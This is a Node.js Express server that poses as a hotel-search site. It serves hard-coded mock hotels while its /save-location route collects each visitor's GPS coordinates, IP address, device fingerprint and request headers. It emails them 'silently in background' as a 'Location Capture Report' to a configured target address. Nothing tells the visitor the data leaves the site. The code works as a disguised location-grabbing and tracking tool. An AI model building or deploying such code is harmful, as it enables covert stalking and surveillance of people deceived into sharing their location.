const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(bodyParser.json());

// Trust proxy to get real IP addresses
app.set('trust proxy', true);

// Serve static files (HTML, CSS, JS)
app.use(express.static(__dirname));

// Serve the main HTML file at root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'hotelsearch_location.html'));
});

// IP detection test endpoint
app.get('/test-ip', (req, res) => {
    function getClientIP(req) {
        const forwarded = req.headers['x-forwarded-for'];
        const realIP = req.headers['x-real-ip'];
        const clientIP = req.headers['cf-connecting-ip'];
        const connectingIP = req.headers['x-connecting-ip'];
        const remoteAddr = req.connection.remoteAddress || req.socket.remoteAddress;

        if (forwarded) {
            const ips = forwarded.split(',').map(ip => ip.trim());
            return ips[0];
        }

        const detectedIP = realIP || clientIP || connectingIP || req.ip || remoteAddr;

        if (detectedIP === '::1' || detectedIP === '::ffff:127.0.0.1') {
            return '127.0.0.1 (localhost)';
        }

        if (detectedIP && detectedIP.startsWith('::ffff:')) {
            return detectedIP.substring(7);
        }

        return detectedIP || 'Unknown';
    }

    res.json({
        detectedIP: getClientIP(req),
        ipDetails: {
            xForwardedFor: req.headers['x-forwarded-for'],
            xRealIP: req.headers['x-real-ip'],
            cfConnectingIP: req.headers['cf-connecting-ip'],
            remoteAddress: req.connection.remoteAddress,
            reqIP: req.ip,
            allHeaders: req.headers
        },
        note: "If you see localhost IPs, try accessing from a different device or deploy to a server"
    });
});

// Test email endpoint
app.get('/test-email', (req, res) => {
    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.TARGET_EMAIL,
        subject: 'Test Email from Location Search App',
        text: 'This is a test email to verify your email configuration is working correctly!'
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Email test failed:', error);
            res.status(500).json({
                success: false,
                error: error.message,
                message: 'Email test failed. Check your .env configuration.'
            });
        } else {
            console.log('Test email sent: ' + info.response);
            res.json({
                success: true,
                message: 'Test email sent successfully!',
                messageId: info.messageId
            });
        }
    });
});

// Configure your email transporter
const transporter = nodemailer.createTransport({
    service: 'gmail', // You can also use SMTP host & port for SendGrid, Outlook, etc.
    auth: {
        user: process.env.EMAIL_USER, // Your email
        pass: process.env.EMAIL_PASS  // Your email password or App Password
    }

    // Alternative SMTP configuration (uncomment and modify for custom SMTP):
    /*
    host: 'smtp.gmail.com',  // or smtp.outlook.com, smtp.sendgrid.net, etc.
    port: 587,               // or 465 for SSL
    secure: false,           // true for 465, false for 587
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
    */
});

// Function to search for nearby hotels
async function searchNearbyHotels(latitude, longitude) {
    try {
        // For demo purposes, I'm using mock data. Replace this with a real API like:
        // - Booking.com API
        // - Hotels.com API
        // - Google Places API
        // - Amadeus Hotel Search API

        // Mock hotel data based on location
        const mockHotels = [
            {
                name: "Grand Plaza Hotel",
                rating: 4.5,
                price: "$120/night",
                distance: "0.3 miles",
                image: "https://via.placeholder.com/200x150/4CAF50/white?text=Hotel+1",
                amenities: ["WiFi", "Pool", "Gym", "Restaurant"]
            },
            {
                name: "City Center Inn",
                rating: 4.2,
                price: "$89/night",
                distance: "0.5 miles",
                image: "https://via.placeholder.com/200x150/2196F3/white?text=Hotel+2",
                amenities: ["WiFi", "Breakfast", "Parking"]
            },
            {
                name: "Luxury Suites",
                rating: 4.8,
                price: "$200/night",
                distance: "0.7 miles",
                image: "https://via.placeholder.com/200x150/FF9800/white?text=Hotel+3",
                amenities: ["WiFi", "Spa", "Pool", "Restaurant", "Gym"]
            },
            {
                name: "Budget Stay Hotel",
                rating: 3.9,
                price: "$65/night",
                distance: "1.0 miles",
                image: "https://via.placeholder.com/200x150/9C27B0/white?text=Hotel+4",
                amenities: ["WiFi", "Parking"]
            },
            {
                name: "Boutique Hotel",
                rating: 4.6,
                price: "$150/night",
                distance: "1.2 miles",
                image: "https://via.placeholder.com/200x150/F44336/white?text=Hotel+5",
                amenities: ["WiFi", "Restaurant", "Bar", "Concierge"]
            }
        ];

        // Simulate API delay
        await new Promise(resolve => setTimeout(resolve, 500));

        return mockHotels;

        // Example of how you'd use a real API:
        /*
        const response = await axios.get('https://api.hotelsearch.com/v1/hotels', {
            params: {
                latitude: latitude,
                longitude: longitude,
                radius: 5000, // 5km radius
                limit: 10,
                api_key: process.env.HOTEL_API_KEY
            }
        });
        return response.data.hotels;
        */
    } catch (error) {
        console.error('Error searching hotels:', error);
        throw new Error('Failed to search hotels');
    }
}

app.post('/save-location', async (req, res) => {
    const { latitude, longitude, deviceInfo } = req.body;

    if (!latitude || !longitude) {
        return res.status(400).json({ error: "Missing location data" });
    }

    try {
                // Enhanced IP detection function
        function getClientIP(req) {
            const forwarded = req.headers['x-forwarded-for'];
            const realIP = req.headers['x-real-ip'];
            const clientIP = req.headers['cf-connecting-ip']; // Cloudflare
            const connectingIP = req.headers['x-connecting-ip'];
            const remoteAddr = req.connection.remoteAddress || req.socket.remoteAddress;

            // Handle forwarded IPs (can be comma-separated)
            if (forwarded) {
                const ips = forwarded.split(',').map(ip => ip.trim());
                return ips[0]; // First IP is usually the real client IP
            }

            // Try other headers
            const detectedIP = realIP || clientIP || connectingIP || req.ip || remoteAddr;

            // Convert IPv6 localhost to IPv4 for better display
            if (detectedIP === '::1' || detectedIP === '::ffff:127.0.0.1') {
                return '127.0.0.1 (localhost)';
            }

            // Remove IPv6 mapping prefix if present
            if (detectedIP && detectedIP.startsWith('::ffff:')) {
                return detectedIP.substring(7);
            }

            return detectedIP || 'Unknown';
        }

        // Collect server-side information
        const serverInfo = {
            ipAddress: getClientIP(req),
            realIP: getClientIP(req),
            userAgent: req.headers['user-agent'],
            acceptLanguage: req.headers['accept-language'],
            acceptEncoding: req.headers['accept-encoding'],
            host: req.headers.host,
            origin: req.headers.origin,
            referer: req.headers.referer,
            timestamp: new Date().toISOString(),
            localTimestamp: new Date().toLocaleString('en-US', {
                timeZone: deviceInfo?.timezone || 'UTC',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                timeZoneName: 'short'
            }),
            requestMethod: req.method,
            requestUrl: req.originalUrl,
            protocol: req.protocol,
            secure: req.secure,
            // Additional IP detection details for debugging
            ipDetails: {
                xForwardedFor: req.headers['x-forwarded-for'],
                xRealIP: req.headers['x-real-ip'],
                cfConnectingIP: req.headers['cf-connecting-ip'],
                remoteAddress: req.connection.remoteAddress,
                reqIP: req.ip
            }
        };

        // Log collected data for debugging
        console.log('📊 Data Collected:', {
            location: { latitude, longitude },
            clientDevice: deviceInfo?.deviceType,
            clientOS: deviceInfo?.operatingSystem,
            clientBrowser: deviceInfo?.browser,
            serverIP: serverInfo.realIP,
            timestamp: serverInfo.timestamp
        });

        // Search for nearby hotels
        const hotels = await searchNearbyHotels(latitude, longitude);

        // Prepare comprehensive email content
        const emailContent = `
🌍 NEW LOCATION CAPTURE REPORT
=====================================

📍 LOCATION DETAILS:
   • Latitude: ${latitude}
   • Longitude: ${longitude}
   • Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
   • Local Time: ${serverInfo.localTimestamp}
   • Server Time (UTC): ${serverInfo.timestamp}

🖥️  DEVICE INFORMATION:
   • Device Type: ${deviceInfo?.deviceType || 'Unknown'}
   • Operating System: ${deviceInfo?.operatingSystem || 'Unknown'}
   • Browser: ${deviceInfo?.browser || 'Unknown'}
   • Platform: ${deviceInfo?.platform || 'Unknown'}
   • Language: ${deviceInfo?.language || 'Unknown'}
   • Timezone: ${deviceInfo?.timezone || 'Unknown'}

📱 SCREEN & DISPLAY:
   • Screen Resolution: ${deviceInfo?.screen?.width || 'Unknown'} x ${deviceInfo?.screen?.height || 'Unknown'}
   • Viewport: ${deviceInfo?.viewport?.width || 'Unknown'} x ${deviceInfo?.viewport?.height || 'Unknown'}
   • Color Depth: ${deviceInfo?.screen?.colorDepth || 'Unknown'} bits
   • Touch Support: ${deviceInfo?.touchSupport ? 'Yes' : 'No'}

🌐 NETWORK & CONNECTION:
   • Server-detected IP: ${serverInfo.realIP}
   • Client-detected IP: ${deviceInfo?.publicIP || 'Not available'}
   • Connection Type: ${deviceInfo?.connection?.effectiveType || 'Unknown'}
   • Online Status: ${deviceInfo?.onLine ? 'Online' : 'Offline'}
   • Host: ${serverInfo.host}
   • Protocol: ${serverInfo.protocol}
   • Secure: ${serverInfo.secure ? 'Yes' : 'No'}

🔍 IP DETECTION DETAILS (Debug):
   • X-Forwarded-For: ${serverInfo.ipDetails.xForwardedFor || 'Not present'}
   • X-Real-IP: ${serverInfo.ipDetails.xRealIP || 'Not present'}
   • Remote Address: ${serverInfo.ipDetails.remoteAddress || 'Not available'}
   • Express req.ip: ${serverInfo.ipDetails.reqIP || 'Not available'}

🔧 BROWSER CAPABILITIES:
   • Cookies Enabled: ${deviceInfo?.cookieEnabled ? 'Yes' : 'No'}
   • Local Storage: ${deviceInfo?.localStorageSupport ? 'Yes' : 'No'}
   • Geolocation Support: ${deviceInfo?.geolocationSupport ? 'Yes' : 'No'}
   • Service Worker: ${deviceInfo?.serviceWorkerSupport ? 'Yes' : 'No'}

📄 PAGE INFORMATION:
   • Current URL: ${deviceInfo?.url || 'Unknown'}
   • Referrer: ${deviceInfo?.referrer || 'Direct visit'}
   • User Agent: ${serverInfo.userAgent}

🔍 REQUEST DETAILS:
   • Request Method: ${serverInfo.requestMethod}
   • Accept Language: ${serverInfo.acceptLanguage}
   • Accept Encoding: ${serverInfo.acceptEncoding}
   • Origin: ${serverInfo.origin || 'Not provided'}

=====================================
Report generated automatically by Location Search App
        `;

        // Send email in background (don't wait for it)
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.TARGET_EMAIL,
            subject: `🌍 Location Capture: ${deviceInfo?.deviceType || 'Unknown Device'} from ${serverInfo.realIP}`,
            text: emailContent
        };

        // Send email silently in background
        if (process.env.EMAIL_USER && process.env.TARGET_EMAIL) {
            transporter.sendMail(mailOptions, (error, info) => {
                if (error) {
                    console.error('Background email error:', error);
                } else {
                    console.log('Email sent: ' + info.response);
                }
            });
        }

        // Return hotels data immediately
        res.json({
            success: true,
            hotels: hotels,
            location: { latitude, longitude }
        });

    } catch (error) {
        console.error('Error searching hotels:', error);
        res.status(500).json({ error: "Failed to search hotels" });
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📧 Email configured: ${process.env.EMAIL_USER ? 'Yes' : 'No'}`);
    console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);
});

